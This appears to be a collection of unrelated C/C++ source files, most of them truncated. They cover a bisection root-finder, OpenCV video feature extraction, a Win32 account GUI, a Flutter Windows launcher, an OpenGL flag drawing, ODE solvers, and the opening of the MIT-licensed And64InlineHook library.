    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <windows.h>\n#define eps 1e-3\n\nvoid read_file(char filename[], int &n, float A[][100], int &check);\nvoid input_file(char a[], float A[][100], int &n);\nvoid change(float A[][100], float B[], int n);\nvoid print_POLYNOMIAL(float B[], int n);\nfloat Fx(float B[], int n, float x0);\nvoid enter_input(float &a, float &b, float B[], int n);\nfloat solve(float B[], float a, float b, int n);\nvoid information();\nvoid result(char a[]);\nint menu_input(int &com);\nvoid mtA(float A[][100], int &n);\nvoid setcolor(int backgound_color, int text_color);\n\nint main()\n{\n    int n,com;\n    float a, b,c;\n    char name[100], re[100], other[1],newP[1];\n    float A[100][100];\n    float B[100];\n\n    information();//Introduce the topic and related information\n   \n    do{\n       menu_input(com);\n       if(com==1){\n        setcolor(0,3);\n        printf(\"\\tMoi ban nhap ma tran A\\n\");\n        printf(\"\\tNhap buc cua ma tran: \");\n        setcolor(0,8);\n        scanf(\"%d\", &n);\n        mtA(A, n);\n       }\n       else if(com==2){\n        (getchar()) != '\\n';         \n        input_file(name,A,n);\n       }\n       \n        setcolor(0,15);\n        change(A,B,n);\n        print_POLYNOMIAL(B,n);\n         while (1){\n            enter_input(a,b,B,n);\n            c=solve(B,a,b,n);\n            setcolor(0,15);\n            printf(\"\\n    Bang gia tri thuc hien phuong phap chia doi\\n\");\n            setcolor(0,3);\n            printf(\"\\nNgiem cua phuong trinh la:  %.3f\", c);\n            printf(\"\\n\\nBan co muon nhap khoang nghiem khac khong (y/n)? \");\n            setcolor(0,8);\n            scanf(\"%s\",other);\n            if (other[0]!='y') break;\n        }\n        setcolor(0,3);\n        printf(\"\\n\\nBan co muon tim nghiem voi da thuc khac khong(Neu muon nhap lai thi chon c, con khong muon thi nhap phim bat ki)? \");\n        setcolor(0,8);\n        scanf(\"%s\", newP);\n    }while(newP[0]=='c');\n    }\n\nvoid setcolor(int backgound_color, int text_color)\n{\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n    int color_code = backgound_color * 16 + text_color;\n    SetConsoleTextAttribute(hStdout, color_code);\n}\n\nvoid information()\n{\n    int i;\n    setcolor(0, 3);\n    printf(\"\\n%9c\", 201);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\", 187);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c                             DO AN LAP TRINH TINH TOAN                                %c\", 4, 4);\n    printf(\"\\n        %c                   DE TAI: Tim nghiem gan dung bang phuong phap chia doi              %c\", 4, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c       Sinh vien thuc hien:                       Giao vien huong dan:                %c\", 4, 4);\n    printf(\"\\n        %c           %c Le Ngoc Lam Na                            %c Do Thi Tuyet Hoa             %c\", 4, 45, 45, 4);\n    printf(\"\\n        %c           %c Le Xuan Tung Son  %56c\", 4, 45, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c\", 200);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\\n\", 188);\n}\n\nvoid read_file(char filename[], int &n, float A[][100], int &check)\n{   setcolor(0,3);\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL)\n    {\n        check = 0;        \n        return;\n    }\n    fscanf(file, \"%d\", &n); // read array size\n    char a;\n    int s = 0, count = 0;\n\n    // check size file\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            if (fscanf(file, \"%f\", &A[i][j]) == 1)\n            { // save data into array A\n                s++;\n                if ((a = fgetc(file)) != '\\n')\n                {\n                    if (a != EOF)\n                        count++;\n                }\n                else\n                {\n                    break;\n                }\n            }\n        }\n        if (count != (n - 1))\n        {\n            check = 2;\n            fclose(file);\n            return;\n        }\n        count = 0;\n    }\n    if (s != n * n)\n    {\n        check = 2;\n        fclose(file);\n        return;\n    }\n    check = 1;\n    fclose;\n}\n\nvoid input_file(char a[], float A[][100], int &n)\n{   \n    setcolor(0,3);\n    int check;\n    do\n    {\n        printf(\"Nhap ten file du lieu: \");\n         setcolor(0, 8);\n        fgets(a, 100, stdin); // input name file to array a\n        a[strcspn(a, \"\\n\")] = 0;\n        setcolor(0,3);\n        read_file(a, n, A, check);\n        if (check == 0)\n        {\n            printf(\"File %s khong ton tai\\n\", a);\n        }\n        else if (check == 2)\n        {\n            printf(\"File %s bi loi \\n\", a);\n        }\n        else\n        {\n            printf(\"Doc file thanh cong\\n\");\n        }\n    } while (check == 0 || check == 2);\n}\n\nvoid change(float A[][100], float B[], int n)\n{ // data analysis\n    B[0] = 0;\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            B[i] += A[j][i];\n        }\n    }\n    float max = B[",
    "#include \"features.h\"\n\n#include <boost/filesystem.hpp>\n\n#include <opencv2/opencv.hpp>\n#include <opencv2/videoio.hpp>\n#include <opencv2/calib3d.hpp>\n#include <opencv2/features2d.hpp>\n#include <opencv2/hdf.hpp>\n\n// #include <sys/ioctl.h> //ioctl() and TIOCGWINSZ\n// #include <unistd.h> // for STDOUT_FILENO\n\n#include <mutex>\n#include <boost/filesystem.hpp>\n#include <boost/program_options.hpp>\n\n#include \"Pool.h\"\n#include \"MatPersistor.h\"\n#include \"ShootSegmenter.h\"\n#include \"Catalog.h\"\n#include \"VocabularyTree.h\"\n#include \"KeyPointPersistor.h\"\n#include \"VecKeyPointPersistor.h\"\n#include \"Fixation.h\"\n\n#include <boost/property_tree/ptree.hpp>\n\ntemplate <typename T, typename... Args>\nvoid compute_descriptor(boost::filesystem::path vocabPath,\n                        const std::string filename,\n                        const size_t videoIndex,\n                        boost::property_tree::ptree const& config,\n                        Args... args) {\n\n    cv::VideoCapture cap { filename };\n    if (!cap.isOpened()) {\n        cap.release();\n        std::cout << \"Video \" << filename << \" does not exist\" << std::endl;\n        return;\n    }\n\n    const int MIN_KEYPOINTS = config.get<int>(\"min_keypoints\");\n    std::string output_path = config.get<std::string>(\"output_directory\");\n    if (output_path.empty()) {\n        const auto path = boost::filesystem::path(filename);\n        output_path = boost::filesystem::change_extension(path, \"\").string();\n    }\n\n    if (boost::filesystem::exists(boost::filesystem::path(output_path + \".vid\")) &&\n        boost::filesystem::exists(boost::filesystem::path(output_path + \".key\"))) {\n        return;\n        VecMatPersistor persistor1 = VecMatPersistor::open(output_path + \".vid\");\n        VecKeyPointPersistor persistor2 = VecKeyPointPersistor::open(output_path + \".key\");\n\n        const int frames = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_COUNT));\n        const size_t size1 = persistor1.getDescriptorInfo().size();\n        const size_t size2 = persistor2.getDescriptorInfo().size();\n        persistor1.close();\n        persistor2.close();\n\n        std::cout << \"frames \" << frames << \" s1: \" << size1 << \" s2 \" << size2 << std::endl;\n        if (size1 == frames && size2 == frames) {\n            std::cout << \"Skip Video: \" << filename << std::endl;\n            return;\n        }\n    }\n    \n    bool hasFrame = true;\n    bool visualize = config.get<bool>(\"visualize\");\n    cv::Mat frame, descriptor, uintDescriptor;\n    std::vector<std::vector<cv::KeyPoint>> keypoints;\n    std::vector<cv::Mat> frames;\n    std::vector<uint32_t> frameIndices;\n\n    cv::Ptr<T> sift = T::create(args...);\n    auto frameCount = std::to_string((size_t)cap.get(cv::CAP_PROP_FRAME_COUNT));\n\n    size_t frameIndex = 0;\n    cv::VideoWriter writer;\n    if(visualize) {\n        Size S = Size((int) cap.get(CAP_PROP_FRAME_WIDTH),    // Acquire input size\n                      (int) cap.get(CAP_PROP_FRAME_HEIGHT));\n        int ex = static_cast<int>(cap.get(cv::CAP_PROP_FOURCC));\n\n        std::cout << \"Write to: \" << boost::filesystem::path(filename).stem().string() + \"-features\" + boost::filesystem::path(filename).extension().string() << std::endl;\n        writer = cv::VideoWriter(boost::filesystem::path(filename).stem().string() + \"-features\" + boost::filesystem::path(filename).extension().string(),\n                                 ex, cap.get(CAP_PROP_FPS), S, true);\n    }\n\n    while(true) {\n        const std::string index = std::to_string(frameIndex);\n        const std::string process = \"\\033[\" + std::to_string(videoIndex + 1) + \";\" + \"0\" + \"H\" + filename +  \": \" + index + '/' + frameCount;\n        std::cout << process;\n\n        cap >> frame;\n        if (frame.empty())\n            break;\n\n        std::vector<KeyPoint> keps;\n        sift->detectAndCompute(frame, cv::noArray(), keps, descriptor, false);\n        if (keps.size() >= MIN_KEYPOINTS) {\n            descriptor.convertTo(uintDescriptor, CV_8U);\n\n            frameIndices.emplace_back(frameIndex);\n            frames.emplace_back(uintDescriptor.clone());\n            keypoints.emplace_back(keps);\n        }\n\n        if (visualize) {\n            cv::drawKeypoints(frame, keps, frame, cv::Scalar_<double>::all(-1), cv::DrawMatchesFlags::DRAW_RICH_KEYPOINTS);\n            writer.write(frame);\n        }\n\n        ++frameIndex;\n    }\n\n    if(visualize) {\n        writer.release();\n    }\n\n\n    VecMatPersistor::create(output_path + \".vid\", frames, frameIndices);\n    VecKeyPointPersistor::create(output_path + \".key\", keypoints, frameIndices);\n    cap.release();\n}\n\nvoid compute_descriptors(const Catalog& catalog, boost::property_tree::ptree const& config) {\n    thread_pool& pool = thread_pool::construct(8);\n    auto output = catalog.getVideoStorage();\n    auto paths = catalog.getVideoPaths();\n\n    // TODO Stupid hack to work around the program not processing the last batch of videos\n    // I really dont know why this is happening tho :/\n    for (int i = 0; i < 8; ++i) {\n        output.push_back(out",
    "#include\"Account.h\"\n#include\"MyWnds.h\"\n#include \"Door.h\"\n#include\"Data.hpp\"\n#include <CommCtrl.h>\n#include <windowsx.h>\n\n\n//\u521d\u59cb\u5316\u603b\u4e2a\u6570\u4e3a0\nUINT Account::mCount = 0;\n\nHWND Account::ActInfoProc_hwnd;\nUINT Account::ActInfoProc_uMsg;\nWPARAM Account::ActInfoProc_wParam;\nLPARAM Account::ActInfoProc_lParam;\n\nBYTE Account::actInfoSysLinkFlag;\n\n//\u7528\u6237\u4fe1\u606f\nLRESULT CALLBACK Account::ActInfoProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\n\tAccount::ActInfoProc_hwnd = hwnd;\n\tAccount::ActInfoProc_uMsg = uMsg;\n\tAccount::ActInfoProc_wParam = wParam;\n\tAccount::ActInfoProc_lParam = lParam;\n\tswitch (uMsg)\n\t{\n\tcase WM_NOTIFY:\n\t\tAccount::ActInfoProc_WM_NOTIFY();\n\t\tbreak;\n\tcase WM_PAINT:\n\t\tAccount::ActInfoProc_WM_PAINT();\n\t\tbreak;\n\tcase WM_CREATE:\n\t\tAccount::ActInfoProc_WM_CREATE();\n\t\tbreak;\n\tdefault://\u672a\u81ea\u5b9a\u4e49\u7684\u5176\u4ed6\u6d88\u606f\n\t\treturn DefWindowProc(hwnd, uMsg, wParam, lParam);//\u9ed8\u8ba4\u7a97\u53e3\u8fc7\u7a0b\n\t}\n\treturn 0;\n}\n\nvoid Account::ActInfoProc_WM_NOTIFY() {\n\tswitch (((LPNMHDR)Account::ActInfoProc_lParam)->code)\n\t{\n\tcase NM_CLICK:case NM_RETURN://\u5355\u51fb\n\t{\n\t\tswitch (LPNMHDR(Account::ActInfoProc_lParam)->idFrom) {\n\t\tcase dataInfoListID:\n\t\t{\n\t\t\t//\u66f4\u65b0\u70b9\u51fb\u7684\u5217\u8868\u5750\u6807\n\t\t\tMyWnds::x_Listview = LPNMITEMACTIVATE(Account::ActInfoProc_lParam)->iSubItem;\n\t\t\tMyWnds::y_Listview = LPNMITEMACTIVATE(Account::ActInfoProc_lParam)->iItem;\n\t\t\tbreak;\n\t\t}\n\t\tcase returnSysLinkID:\n\t\t{\n\t\t\t//\u9500\u6bc1\u63a7\u4ef6\n\t\t\tMyWnds::DestroyControl(Account::ActInfoProc_hwnd, { returnSysLinkID,dataInfoListID,dataInfoSysLinkID });\n\t\t\t//\u521b\u5efa\u63a7\u4ef6\n\t\t\tSendMessage(GetDlgItem(MyWnds::MainWndProc_hwnd, actInfoWndID), WM_CREATE, NULL, NULL);\n\t\t\t//\u66f4\u6539\u6807\u8bb0\n\t\t\tAccount::actInfoSysLinkFlag = 0;\n\t\t\t//\u91cd\u7ed8\u6574\u4e2a\u7a97\u53e3\n\t\t\tInvalidateRect(Account::ActInfoProc_hwnd, NULL, TRUE);\n\t\t\tSendMessage(Account::ActInfoProc_hwnd, WM_PAINT, NULL, NULL);\n\t\t\tbreak;\n\t\t}\n\t\tcase browseActSysLinkID:\n\t\t{\n\t\t\t//\u5217\u8868\u5750\u6807\u521d\u59cb\u5316\n\t\t\tMyWnds::x_Listview = -1;\n\t\t\tMyWnds::y_Listview = 0;\n\t\t\tMyWnds::DestroyControl(Account::ActInfoProc_hwnd, { editActNameSysLinkID,editPasswdSysLinkID,creditSysLinkID,logoutSysLinkID,browseActSysLinkID });\n\t\t\t//\u8fd4\u56de\n\t\t\tCreateWindowEx(\n\t\t\t\t0, _T(\"SysLink\"), _T(\"<A HREF=\\\"\u8fd4\u56de\\\">\u8fd4\u56de</A>\"), WS_CHILD | WS_VISIBLE | LWS_TRANSPARENT | WS_TABSTOP,\n\t\t\t\tint(0.1 * MyWnds::homePageWidth), int(0.05 * MyWnds::homePageHeight), int(0.1 * MyWnds::homePageWidth), int(0.05 * MyWnds::homePageHeight),\n\t\t\t\tAccount::ActInfoProc_hwnd, HMENU(returnSysLinkID), MyWnds::hInstance, NULL\n\t\t\t);\n\t\t\tSendMessage(GetDlgItem(Account::ActInfoProc_hwnd, returnSysLinkID), WM_SETFONT, (WPARAM)MyWnds::currentHFONT, TRUE);\n\t\t\t//\u66f4\u6539\u7528\u6237\u4fe1\u606f\n\t\t\tCreateWindowEx(\n\t\t\t\t0, _T(\"SysLink\"), _T(\"<A HREF=\\\"\u6dfb\u52a0\\\">\u6dfb\u52a0</A>\")\\\n\t\t\t\t_T(\" <A HREF=\\\"\u4fee\u6539\\\">\u4fee\u6539</A>\")\\\n\t\t\t\t_T(\" <A HREF=\\\"\u5220\u9664\\\">\u5220\u9664</A>\"),\n\t\t\t\tWS_CHILD | WS_VISIBLE | LWS_TRANSPARENT | WS_TABSTOP,\n\t\t\t\tint(0.8 * MyWnds::homePageWidth), int(0.05 * MyWnds::homePageHeight), int(0.2 * MyWnds::homePageWidth), int(0.05 * MyWnds::homePageHeight),\n\t\t\t\tAccount::ActInfoProc_hwnd, HMENU(dataInfoSysLinkID), MyWnds::hInstance, NULL\n\t\t\t);\n\t\t\tSendMessage(GetDlgItem(Account::ActInfoProc_hwnd, dataInfoSysLinkID), WM_SETFONT, (WPARAM)MyWnds::currentHFONT, TRUE);\n\t\t\t//\u7528\u6237\u4fe1\u606f\u5217\u8868\n\t\t\tCreateWindowEx(\n\t\t\t\t0, WC_LISTVIEW, _T(\"\"), WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | WS_HSCROLL | LVS_REPORT | LVS_SHOWSELALWAYS,\n\t\t\t\tint(0.05 * MyWnds::homePageWidth), int(0.1 * MyWnds::homePageHeight), int(0.9 * MyWnds::homePageWidth), int(0.85 * MyWnds::homePageHeight),\n\t\t\t\tAccount::ActInfoProc_hwnd, (HMENU)dataInfoListID, MyWnds::hInstance, NULL\n\t\t\t);\n\t\t\tSendMessage(GetDlgItem(Account::ActInfoProc_hwnd, dataInfoListID), WM_SETFONT, (WPARAM)MyWnds::currentHFONT, TRUE);\n\t\t\tListView_SetExtendedListViewStyle(GetDlgItem(Account::ActInfoProc_hwnd, dataInfoListID), LVS_EX_COLUMNSNAPPOINTS | LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);\n\t\t\t//\u63d2\u5165\u5217\n\t\t\tLVCOLUMN temp = { 0 };\n\t\t\ttemp.mask = LVCF_TEXT | LVCF_FMT | LVCF_WIDTH | LVCF_MINWIDTH | LVCF_SUBITEM | LVCF_DEFAULTWIDTH;\n\t\t\ttemp.fmt = LVCFMT_CENTER;\n\t\t\ttemp.cx = int(0.07 * MyWnds::homePageWidth);\n\t\t\ttemp.pszText = (LPTSTR)_T(\"\u5e8f\u53f7\");\n\t\t\ttemp.iSubItem = 0;\n\t\t\ttemp.cxDefault = 1;\n\t\t\ttemp.cxMin = int(0.07 * MyWnds::homePageWidth);\n\t\t\tListView_InsertColumn(GetDlgItem(Account::ActInfoProc_hwnd, dataInfoListID), 0, &temp);\n\n\t\t\ttemp.cx = int(0.16 * MyWnds::homePageWidth);\n\t\t\ttemp.pszText = (LPTSTR)_T(\"\u7528\u6237\u6635\u79f0\");\n\t\t\ttemp.iSubItem = 1;\n\t\t\ttemp.cxDefault = 0;\n\t\t\ttemp.cxMin = int(0.16 * MyWnds::homePageWidth);\n\t\t\tListView_InsertColumn(GetDlgItem(Account::ActInfoProc_hwnd, dataInfoListID), 1, &temp);\n\n\t\t\ttemp.cx = int(0.15 * MyWnds::homePageWidth);\n\t\t\ttemp.pszText = (LPTSTR)_T(\"\u7528\u6237\u540d\");\n\t\t\ttemp.iSubItem = 2;\n\t\t\ttemp.cxDefault = 0;\n\t\t\ttemp.cxMin = int(0.15 * MyWnds::homePageWidth);\n\t\t\tListView_InsertColumn(GetDlgItem(Account::ActInfoProc_hwnd, dataInfoListID), 2, &temp);\n\n\t\t\ttemp.cx = int(0.15 * MyWnds::homePageWidth);\n\t\t\ttemp.pszText = (LPTSTR)_T(\"\u5bc6\u7801\");\n\t\t\ttemp.iSubItem = 3;\n\t\t\ttemp.cxDefault = 0;\n\t\t\ttemp.cxMin = int(0.15 * MyWnds::homePageWidth);\n\t\t\tListView_InsertColumn(GetDlgItem(Account::ActInfoProc_hwnd, dataInfoListID), 3, &temp);\n\n\n\t\t\ttemp.cx = int(0.06 * MyWnds::homePageW",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_list_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<GL/glut.h>\nvoid init(){\n\tglClearColor(0, 0, 0, 1);\n\tglMatrixMode(GL_PROJECTION);\n    glOrtho(-200,200,-200,200,-200,200);\n\n\n}\nvoid display() {\n\tglClear(GL_COLOR_BUFFER_BIT);\n\t//white quad\n\tglBegin(GL_QUADS);\n\tglColor3f(1, 1, 1);\n\tglVertex2i(-20,0);\n\tglVertex2i(-20, 15);\n\tglVertex2i(36, 15);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t//red quad\n\tglColor3f(1, 0, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20,0);\n\tglVertex2i(36,0);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t// blue triangle\n\tglColor3f(0, 0, 1);\n\tglBegin(GL_TRIANGLES);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20, 15);\n\tglVertex2i(-2, 0);\n\tglEnd();\n\t//pole \n\tglColor3f(0, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-25,-75);\n\tglVertex2i(-25,15);\n\tglVertex2i(-20,15 );\n\tglVertex2i(-20, -75);\n\tglEnd();\n\t//base height\n\tglColor3f(1, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-35,-102);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10,-75);\n\tglVertex2i(-10,-102);\n\tglEnd();\n\t// top stand \n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10, -75);\n\tglVertex2i(-15,-83);\n\tglEnd();\n\t//stand hieght\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40, -87);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-15,-83);\n\tglVertex2i(-15,-87);\n\tglEnd();\n\t//middle stand\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-40,-87);\n\tglVertex2i(-15,-87);\n\tglVertex2i(-20,-92);\n\tglEnd();\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-20,-92);\n\tglVertex2i(-20,-97);\n\tglEnd();\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-50,-102);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-20,-97);\n\tglVertex2i(-25,-102);\n\tglEnd();\n\n\tglFlush();\n\n\n}\nint main(int argc,char** argv) {\n\tglutInit(&argc, argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowPosition(0, 0);\n\tglutInitWindowSize(1000, 700);\n\tglutCreateWindow(\"day one\");\n\tinit();\n\tglutDisplayFunc(display );\n\tglutMainLoop();\n\t\n\n\t\n}",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <iomanip>\n\nstd::vector<double> operator*(double scalar, const std::vector<double> &v) {\n    std::vector<double> result(v.size());\n    for (int i = 0; i < v.size(); i++) {\n        result[i] = v[i] * scalar;\n    }\n    return result;\n}\n\nstd::vector<double> operator+(const std::vector<double> &v1, const std::vector<double> &v2) {\n    std::vector<double> result(v1.size());\n    for (int i = 0; i < v1.size(); i++) {\n        result[i] = v1[i] + v2[i];\n    }\n    return result;\n}\n\nstd::vector<double> F(double x, const std::vector<double> &y) {\n    std::vector<double> f(2);\n    f[0] = std::cos(-1 + x + y[0] + 3 * y[1]);\n    f[1] = -y[0] * y[0] + 2 * std::sin(y[1]);\n    return f;\n}\n\nvoid Euler(double n, std::vector<double> (*func)(double, const std::vector<double> &), std::vector<double> &a, double x0, double xEnd, double accuracy, int eq) {\n    std::vector<std::vector<double>> container;\n    std::cout << std::setw(2)  << \"i\"; \n    std::cout << std::setw(15) << \"A(h_i)\";\n    std::cout << std::setw(20) << \"A(h_(i-1))-A(h_i)\"; \n    std::cout << std::setw(15) << \"alpha_k\";\n    std::cout << std::setw(15) << \"rich-error\"; \n    std::cout << std::setw(15) << \"order\";\n    std::cout << std::setw(10) << \"n\";\n    std::cout << std::endl;\n\n    double prev_prev_integral = 0.0;\n    double prev_integral = 0.0;\n    for (int i = 0; i < 50; i++) {\n        std::vector<double> yn = a;\n        double h = (xEnd - x0) / n;\n        for (int j = 0; j < n; j++) {\n            yn = yn + h * func(x0 + j * h, yn);\n        }\n        \n        container.push_back(yn);\n\n        double integral = container[i][eq];\n        std::cout << std::setw(2) << i << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson;\n                std::cout << std::setw(15) << std::log2(diff1 / diff);\n                if (std::abs(richardson) < accuracy) {\n                    std::cout << std::setw(10) << n << std::endl;\n                    std::cout << std::endl;\n                    break;\n                }\n            } else {\n                std::cout << std::setw(45) << \" \";\n            }\n        } else {\n            std::cout << std::setw(65) << \" \";\n        }\n        std::cout << std::setw(10) << n;\n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n        n *= 2;\n    }\n    std::cout << std::endl;\n}\n\nvoid Midpoint(double n, std::vector<double> (*func)(double, const std::vector<double> &), std::vector<double> &a, double x0, double xEnd, double accuracy, int eq) {\n    std::vector<std::vector<double>> container;\n    std::cout << std::setw(2)  << \"i\"; \n    std::cout << std::setw(15) << \"A(h_i)\";\n    std::cout << std::setw(20) << \"A(h_(i-1))-A(h_i)\"; \n    std::cout << std::setw(15) << \"alpha_k\";\n    std::cout << std::setw(15) << \"rich-error\"; \n    std::cout << std::setw(15) << \"order\";\n    std::cout << std::setw(10) << \"n\";\n    std::cout << std::endl;\n\n    double prev_prev_integral = 0.0;\n    double prev_integral = 0.0;\n    for (int i = 0; i < 50; i++) {\n        std::vector<double> yn = a;\n        double h = (xEnd - x0) / n;\n        for (int j = 0; j < n; j++) {\n            std::vector<double> k1 = func(x0 + j * h, yn);\n            std::vector<double> k2 = func(x0 + j * h + h * 0.5, yn + 0.5 * h * k1);\n            yn = yn + h * k2;\n        }\n        \n        container.push_back(yn);\n\n        double integral = container[i][eq];\n        std::cout << std::setw(2) << i << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 1.0); \n                std::cout << std::setw(15) << alpha_k; \n                std::cout << std::setw(15) << richardson;\n                std::cout << std::setw(15) << std::log2(diff1 / diff);\n                if (std::abs(richardson) < accuracy) {\n                    std::cout << std::setw(10) << n << std::endl;\n                    std::cout << std::endl;\n                    break;\n                }\n            } else {\n                std::cout << std::setw(45) << \" \";\n            }\n        } else {\n            std::cout << std::setw(65) << \" \";\n        }\n        std::cout << std::setw(10) << n;\n        std::cout << std::endl;\n        prev_prev_integral = prev_integral;\n        prev_integral = integral;\n        n",
    "/*\n *  @date   : 2018/04/18\n *  @author : Rprop (r_prop@outlook.com)\n *  https://github.com/Rprop/And64InlineHook\n */\n/*\n MIT License\n\n Copyright (c) 2018 Rprop (r_prop@outlook.com)\n\n Permission is hereby granted, free of charge, to any person obtaining a copy\n of this software and associated documentation files (the \"Software\"), to deal\n in the Software without restriction, including without limitation the rights\n to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the Software is\n furnished to do so, subject to the following conditions:\n\n The above copyright notice and this permission notice shall be included in all\n copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n SOFTWARE.\n */\n#define  __STDC_FORMAT_MACROS\n\n#include <inttypes.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n#include <android/log.h>\n#include <cstring>\n#include <errno.h>\n\n#if defined(__aarch64__)\n\n#include \"And64InlineHook.hpp\"\n\n#define   A64_MAX_INSTRUCTIONS 5\n#define   A64_MAX_REFERENCES   (A64_MAX_INSTRUCTIONS * 2)\n#define   A64_NOP              0xd503201fu\n#define   A64_JNIEXPORT        __attribute__((visibility(\"hidden\")))\n#define   A64_LOGE(...)        ((void)__android_log_print(ANDROID_LOG_ERROR, \"A64_HOOK\", __VA_ARGS__))\n#ifndef NDEBUG\n# define  A64_LOGI(...)        ((void)__android_log_print(ANDROID_LOG_INFO, \"A64_HOOK\", __VA_ARGS__))\n#else\n# define  A64_LOGI(...)        ((void)0)\n#endif // NDEBUG\ntypedef uint32_t *__restrict *__restrict instruction;\ntypedef struct {\n    struct fix_info {\n        uint32_t *bp;\n        uint32_t ls; // left-shift counts\n        uint32_t ad; // & operand\n    };\n    struct insns_info {\n        union {\n            uint64_t insu;\n            int64_t ins;\n            void *insp;\n        };\n        fix_info fmap[A64_MAX_REFERENCES];\n    };\n    int64_t basep;\n    int64_t endp;\n    insns_info dat[A64_MAX_INSTRUCTIONS];\n\npublic:\n    inline bool is_in_fixing_range(const int64_t absolute_addr) {\n        return absolute_addr >= this->basep && absolute_addr < this->endp;\n    }\n\n    inline intptr_t get_ref_ins_index(const int64_t absolute_addr) {\n        return static_cast<intptr_t>((absolute_addr - this->basep) / sizeof(uint32_t));\n    }\n\n    inline intptr_t get_and_set_current_index(uint32_t *__restrict inp, uint32_t *__restrict outp) {\n        intptr_t current_idx = this->get_ref_ins_index(reinterpret_cast<int64_t>(inp));\n        this->dat[current_idx].insp = outp;\n        return current_idx;\n    }\n\n    inline void reset_current_ins(const intptr_t idx, uint32_t *__restrict outp) {\n        this->dat[idx].insp = outp;\n    }\n\n    void\n    insert_fix_map(const intptr_t idx, uint32_t *bp, uint32_t ls = 0u, uint32_t ad = 0xffffffffu) {\n        for (auto &f : this->dat[idx].fmap) {\n            if (f.bp == NULL) {\n                f.bp = bp;\n                f.ls = 